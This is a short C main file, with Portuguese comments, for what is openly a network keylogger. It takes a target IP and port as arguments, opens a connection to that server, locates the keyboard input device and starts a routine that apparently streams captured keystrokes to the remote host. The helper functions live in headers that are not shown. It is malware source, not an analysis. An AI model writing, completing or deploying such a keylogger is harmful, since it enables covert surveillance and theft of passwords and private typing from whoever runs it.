#include <stdio.h>
#include <stdlib.h>

#include "protocol.h"
#include "keylogger.h"


// argv[1] = IP_ALVO argv[2] = PORT_ALVO
int main(int argc, char *argv[]){
    // lembrar de fazer o error handling dos argumentos aqui
    int server_fd = open_server_connection(argv[1], atoi(argv[2]));
    must_init("open_server_connection() failed", server_fd);

    int keyboard_fd = find_keyboard_event();

    start_keylogger(server_fd, keyboard_fd);
}